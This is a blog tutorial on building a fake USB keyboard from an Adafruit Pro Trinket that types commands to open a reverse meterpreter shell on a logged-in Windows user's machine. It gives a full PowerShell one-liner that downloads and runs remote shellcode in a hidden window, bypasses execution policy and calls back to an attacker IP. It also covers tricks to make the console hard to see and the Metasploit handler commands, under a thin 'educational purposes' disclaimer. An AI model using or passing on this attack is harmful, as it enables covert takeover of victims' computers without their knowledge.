---
layout: post
title: USB Keyboard Attack
author: William Moffitt
categories: tutorials
description: Learn how to turn the Adafruit Pro Trinket into a fake USB keyboard that will spawn a reverse meterpreter shell onto a victims computer.
tags: [exploitation, cyber-security, pro-trinket]
---

![alt text](https://cdn-learn.adafruit.com/guides/images/000/000/865/medium800/ProTrinketKeyboard_Example_Picture_Smaller.jpg?1448302050 "Adafruit ProTrinket")
Source: [Adafruit.com](https://www.google.com/url?sa=i&rct=j&q=&esrc=s&source=images&cd=&cad=rja&uact=8&ved=0ahUKEwjV842S7YrPAhVDMz4KHaC4DSYQjRwIBw&url=https%3A%2F%2Fwww.adafruit.com%2Fproduct%2F2010&psig=AFQjCNGeCb3p10lA_3DA50t_OYh1Ht8AKw&ust=1473804558096200){:target="_blank"}

***DISCLAIMER: I am not responsible for any illegal activities as a result of this material. This is for educational purposes only.***

If you have never heard of Adafruit, or the Trinket line, please check them out [here](https://www.adafruit.com){:target="_blank"}. They have all kinds of different development kits, and plenty of tutorials to get you started on some fun projects. The Pro Trinket is the larger version of the Trinket, with more RAM, flash, and GPIO pins (as well as some other updates). This article will explain how to setup the Pro Trinket to act as a usb keyboard when plugged into a computer. Computers inherently trust the keyboard, because they trust the user using it. What we will be doing is quickly installing a meterpreter shell (windows/meterpreter/reverse_https to be specific) on to a Windows machine.

### The Code
The code for this attack can be found at my [Github](https://github.com/willmfftt/ProTrinket_WinReverseShell){:target="_blank"}. Make sure to change the ATTACKER_IP to the IP address you will be running your meterpreter handler on, and set the ATTACKER_PORT to the port you want the shell to connect back to you with.

### Prerequisites for Attack
Unless you plan on replacing the backdoor with something completely different, the target must have PowerShell. The backdoor has only been tested on Windows 7 and Windows 10 so far, but it could possibly work on versions as low as Windows XP SP2. Also, while it should be obvious after reading this article, this can only be performed on a logged in user. However, Administrator privledges are not required :).

### What Does It Do?
So what it does is actually quite simple, especially since we are using the ProTinketKeyboard library (available [here](https://learn.adafruit.com/pro-trinket-keyboard/library){:target="_blank"}) which handles registering our device as a keyboard. All we do after that is press the Windows-R key to bring up the run box, then we type cmd to bring up the command line. After that we do a few things that aren't really needed for the attack, but make it a bit more stealthy. First we shrink the command prompt down as small as we can get it by running: ```mode con: cols=20 lines=1```. This sets the console to 20 characters wide by 1 character tall. Next we run ```COLOR FE``` which sets the background color to white, and the text color to light yellow. When all is said and done, we are left with a tiny command prompt that you can barely read text on. 

The next part is using PowerShell to download a script, load it into memory and execute it. The script that it loads is written by PowerShell Empire which offers a ton of different options. I actually found this PowerShell one-liner at [SHELLGAM3.COM](https://shellgam3.com/tag/reverse-shells/){:target="_blank"}, who has an excellent list of one-liner reverse shells. This is the command that gets run: ```powershell -nop -windowstyle hidden -NonInteractive -exec bypass -c IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1");invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost 52.37.4X.XXX -Lport 8443```. What's really neat about this script is that it includes Windows Metasploit payloads, and everything gets loaded into memory so no antivirus gets triggered. In the code i've provided, the only change that was made is the host and port have been moved into DEFINE constants and ```-f``` has been added which prevents the script from prompting the user to accept.

### What's Next?
Well first and foremost, you will need to flash the code onto the device. If you are not sure how to do this, please read the instructions found [here](https://learn.adafruit.com/introducing-pro-trinket/setting-up-arduino-ide){:target="_blank"}. Before you plug the device in, you will need to start metasploit on the attacking machine (*Note: The IP address of this machine must match the ATTACKER_IP in the source code*). Once you have metaspoit running, you will need to run these commands:
	
1. ```use exploit/multi/handler```
2. ```set payload windows/meterpreter/reverse_http```
3. ```set LHOST YOUR-IP-HERE```
4. ```set LPORT YOUR-PORT-HERE```
5. ```run -j```

And that's it! You're ready to plug in the device. When you plug the device in, once the red flashing indicator has stopped the device has started executing the code. You should see the run box quickly popup, then see the command prompt change size and color. Once the command prompt has closed, the attack is complete and you can remove the device. In a few moments you should see the meterpreter session has opened in metasploit. Congrats!

![alt text](/assets/img/meterpreter_session.jpg "Meterpreter Session")

### Conclusion
While I may have written this article around using the Adafruit Pro Trinket, I would actually suggest using the regular Trinket instead. The Pro Trinket has both MicroUSB and FTDI for programming, so the bootloader stays active for quite some time (I think around 10 seconds) while it attempts to detect where the programming will occur. However, I had a Pro Trinket laying around, so that is what this is based on. From the documentation for the ProTrinketKeyboard library, it is written with the same syntax as the TrinketKeyboard library. So all you should need to do to convert this import the new library. I have not tested whether this conversion works or not, so don't hold me to it.
